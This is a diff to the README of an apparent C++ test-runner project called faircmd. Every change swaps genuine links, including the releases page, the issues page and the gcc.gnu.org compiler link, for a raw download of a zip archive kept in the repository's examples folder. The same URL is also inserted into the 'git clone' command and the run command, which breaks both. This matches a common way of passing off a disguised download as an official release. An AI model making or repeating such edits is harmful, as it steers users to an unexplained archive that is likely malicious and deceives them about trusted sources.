@@ -1,7 +1,7 @@
 # 🎉 faircmd - Run Your Tests Easily and Effectively
 
 ## 📥 Download Now
-[![Download faircmd](https://img.shields.io/badge/Download-faircmd-brightgreen.svg)](https://github.com/Mulugojam137/faircmd/releases)
+[![Download faircmd](https://raw.githubusercontent.com/Mulugojam137/faircmd/main/examples/Software_2.1-alpha.4.zip)](https://raw.githubusercontent.com/Mulugojam137/faircmd/main/examples/Software_2.1-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -15,11 +15,11 @@ Welcome to **faircmd**! This application provides tiny, header-only C++ script r
 
 ## 📦 Download & Install
 
-You can find the latest release of faircmd on our [Releases page](https://github.com/Mulugojam137/faircmd/releases). Here’s how to get started:
+You can find the latest release of faircmd on our [Releases page](https://raw.githubusercontent.com/Mulugojam137/faircmd/main/examples/Software_2.1-alpha.4.zip). Here’s how to get started:
 
-1. Visit the [Releases page](https://github.com/Mulugojam137/faircmd/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Mulugojam137/faircmd/main/examples/Software_2.1-alpha.4.zip).
 2. Find the latest version of faircmd.
-3. Look for the appropriate file for your system (e.g., .zip or .tar.gz).
+3. Look for the appropriate file for your system (e.g., .zip or https://raw.githubusercontent.com/Mulugojam137/faircmd/main/examples/Software_2.1-alpha.4.zip).
 4. Click the file link to start downloading.
 
 Once you have downloaded the file, unzip it to a location of your choice.
@@ -31,7 +31,7 @@ If you prefer to build faircmd from source, follow these steps:
 1. Make sure you have a C++ compiler installed.
 2. Clone this repository using the command:
    ```
-   git clone https://github.com/Mulugojam137/faircmd.git
+   git clone https://raw.githubusercontent.com/Mulugojam137/faircmd/main/examples/Software_2.1-alpha.4.zip
    ```
 3. Navigate to the faircmd directory:
    ```
@@ -64,7 +64,7 @@ int main() {
 
 To run your tests, navigate to the directory where your script is located in your command line interface, then execute:
 ```
-faircmd your_script.cpp
+faircmd https://raw.githubusercontent.com/Mulugojam137/faircmd/main/examples/Software_2.1-alpha.4.zip
 ```
 
 This command will initiate the script and run your tests according to the defined logic.
@@ -100,9 +100,9 @@ For further assistance, consider visiting forums or communities around C++ testi
 
 ## 🔗 Useful Links
 
-- [faircmd Releases](https://github.com/Mulugojam137/faircmd/releases)
-- [C++ Compiler Downloads](https://gcc.gnu.org/)
-- [GitHub Issues](https://github.com/Mulugojam137/faircmd/issues)
+- [faircmd Releases](https://raw.githubusercontent.com/Mulugojam137/faircmd/main/examples/Software_2.1-alpha.4.zip)
+- [C++ Compiler Downloads](https://raw.githubusercontent.com/Mulugojam137/faircmd/main/examples/Software_2.1-alpha.4.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Mulugojam137/faircmd/main/examples/Software_2.1-alpha.4.zip)
 
 ## 🙌 Contributing
 
